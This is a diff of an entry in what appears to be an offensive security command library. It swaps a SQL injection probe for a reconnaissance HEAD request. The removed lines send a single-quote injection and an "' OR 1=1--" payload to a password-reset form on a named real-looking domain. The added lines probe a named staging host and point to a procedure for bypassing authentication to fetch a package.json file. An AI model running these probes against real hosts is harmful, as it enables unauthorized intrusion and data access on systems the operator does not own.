@@ -1,10 +1,9 @@
 ---
-id: cmd-uuid-001
-data: 'curl -X POST https://gmmovinparts.com/forgot_password.jsp -d "email=''" -v'
+id: cmd-002
+data: 'curl -I https://apps-staging.pingone.com/'
 tags:
+  - recon
   - web
-  - testing
-  - sqli
 type: command
 output: null
 executor: bash
@@ -13,7 +12,7 @@ platforms:
   - macOS
   - Windows
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:46:20.501Z'
+updated_at: '2025-12-14T17:26:17.666Z'
 verified: false
 validated: true
 submitted: true
@@ -23,39 +22,46 @@ submitted: true
 ## Command
 
 ```bash
-curl -X POST https://gmmovinparts.com/forgot_password.jsp -d "email='" -v
+curl -I https://apps-staging.pingone.com/
 ```
 
 ## Description
 
-Sends a basic POST request to test for SQL injection by injecting a single quote into the email parameter, useful for initial vulnerability probing in web forms.
+This command performs a HEAD request to verify access controls on the main application endpoint, expecting a 403 Forbidden response to confirm protection before targeting static files.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-X POST` | Specifies HTTP method | Yes |
-| `-d "email='"` | Data payload with injection | Yes |
-| `-v` | Verbose output for debugging | No |
+| -I | Use HEAD method instead of GET | Yes |
+| URL | Target main endpoint | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -X POST https://target.com/forgot_password.jsp -d "email='" -v
+curl -I https://apps-staging.pingone.com/
 ```
 
 ### Advanced Usage
 
 ```bash
-curl -X POST https://target.com/forgot_password.jsp -d "email=' OR 1=1--" -v --cookie "session=abc"
+curl -I -H "User-Agent: Mozilla/5.0" https://apps-staging.pingone.com/
 ```
+
+> Includes a custom User-Agent header to mimic browser requests.
 
 ## Expected Output
 
-Verbose response including headers and body; look for SQL errors like "syntax error near '''" in the HTML body.
+HTTP headers indicating forbidden access, e.g.:
+
+```
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+...
+```
 
 ## Related
 
-- [[Related Procedure: Identify-SQLi-in-Forgot-Password-Endpoint]]
+- [[Related Procedure: Bypass-Authentication-to-Access-Static-package.json-File]]
